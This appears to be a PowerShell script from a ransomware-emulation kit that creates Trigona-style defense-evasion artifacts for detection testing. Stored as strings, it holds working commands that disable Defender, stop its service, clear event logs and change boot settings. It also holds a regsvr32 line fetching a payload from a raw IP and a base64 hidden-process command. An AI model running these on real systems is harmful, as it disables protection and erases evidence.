# ============================================================================
# TRIGONA RANSOMWARE SIMULATION - PHASE 3: DEFENSE EVASION
# ============================================================================
# This script simulates defense evasion techniques used in the Trigona attack
# including disabling security tools and process injection.
# ============================================================================

function Simulate-DefenseEvasion {
    param($SimPaths)
    
    Write-Host "[+] Simulating Defense Evasion Techniques..." -ForegroundColor Green
    
    # Create obfuscated PowerShell script
    $obfuscatedScriptContent = '
function Dis-ABlEdEFenSe {
    # This simulates malicious defense evasion
    $sVC = "windefend"
    Set-MPPrefErEnCE -DiSaBlEREALTIMeMONIToRINg $true
    Set-MPPrefErEnCE -DIsABleIOAVPROTecTION $true
    
    # Attempt to disable services
    STop-SErviCe -Name $sVC -Force -ErrorAction SilentlyContinue
    
    # Attempt to modify registry values
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
    
    # Attempt to modify boot configuration
    bcdedit /set "{current}" bootstatuspolicy ignoreallfailures
}

function CleaR-LoGs {
    # This simulates cleaning event logs
    wevtutil cl "Security"
    wevtutil cl "System"
    wevtutil cl "Application"
    
    # Clear PowerShell logs
    Remove-Item -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
}
'
    $obfuscatedScriptPath = "$($SimPaths.Tools)\defense_evade.ps1"
    Set-Content -Path $obfuscatedScriptPath -Value $obfuscatedScriptContent -Force
    
    # Create Base64 encoded script (common evasion technique)
    $encodedCommand = "cG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtYyAiSW52b2tlLVdtaU1ldGhvZCB3aW4zMl9wcm9jZXNzIC1uYW1lIGNyZWF0ZSAtYXJndW1lbnRsaXN0ICdjbWQuZXhlIC9jIHdob2FtaSciCg=="
    $encodedScriptPath = "$($SimPaths.Tools)\encoded_command.txt"
    Set-Content -Path $encodedScriptPath -Value $encodedCommand -Force
    
    # Create a script that simulates disabling Windows Defender and other security tools
    $disableDefenderScriptContent = '
# Simulate disabling Windows Defender (doesnt actually disable)
New-Item -Path "HKCU:\Software\TrigonaSim\WindowsDefender" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\TrigonaSim\WindowsDefender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\TrigonaSim\WindowsDefender" -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType DWord -Force | Out-Null

# Record Defender disable attempt in logs
Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1340 -Message "SIMULATION: Attempt to disable Windows Defender detected" -EntryType Warning

# Simulate disabling firewall (doesnt actually disable)
New-Item -Path "HKCU:\Software\TrigonaSim\Firewall" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\TrigonaSim\Firewall" -Name "EnableFirewall" -Value 0 -PropertyType DWord -Force | Out-Null

# Record firewall disable attempt in logs
Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1341 -Message "SIMULATION: Attempt to disable Windows Firewall detected" -EntryType Warning
'
    $disableDefenderScriptPath = "$($SimPaths.Tools)\disable_security.ps1"
    Set-Content -Path $disableDefenderScriptPath -Value $disableDefenderScriptContent -Force
    
    # Create LOLBINs usage artifacts
    $lolbinsCommands = @(
        "odbcconf.exe /a {regsvr $env:TEMP\malicious.dll}",
        "regsvr32.exe /s /u /i:http://23.146.242.199/payload.sct scrobj.dll",
        "rundll32.exe advpack.dll,LaunchINFSection $env:TEMP\payload.inf,DefaultInstall_SingleUser,1,"
    )
    $lolbinsLogPath = "$($SimPaths.Logs)\lolbins_execution.log"
    Set-Content -Path $lolbinsLogPath -Value $lolbinsCommands -Force
    
    # Create process injection artifact
    $injectionScriptContent = '
# Script to simulate process injection
Write-Host "Simulating process injection..."

# Target process
$targetProcess = "explorer.exe"
$targetPid = (Get-Process -Name $targetProcess -ErrorAction SilentlyContinue).Id

if ($targetPid) {
    # Log the simulated injection
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1342 -Message "SIMULATION: Process injection into $targetProcess (PID: $targetPid) detected" -EntryType Warning
    
    # Create a file that simulates a memory dump of injected code
    $injectedBytes = New-Object byte[] 4096
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($injectedBytes)
    [System.IO.File]::WriteAllBytes("$($SimPaths.Logs)\$targetProcess.$targetPid.dmp", $injectedBytes)
}
'
    $injectionScriptPath = "$($SimPaths.Tools)\process_injection.ps1"
    Set-Content -Path $injectionScriptPath -Value $injectionScriptContent -Force
    
    # Execute some of these scripts to generate artifacts
    try {
        # Run the disable defender script (safe simulation)
        & powershell -ExecutionPolicy Bypass -File $disableDefenderScriptPath
        
        # Execute the injection script
        & powershell -ExecutionPolicy Bypass -File $injectionScriptPath
    } catch {
        Write-Warning "Error during defense evasion simulation: $_"
    }
    
    Write-Host "  [✓] Defense Evasion artifacts created" -ForegroundColor Yellow
}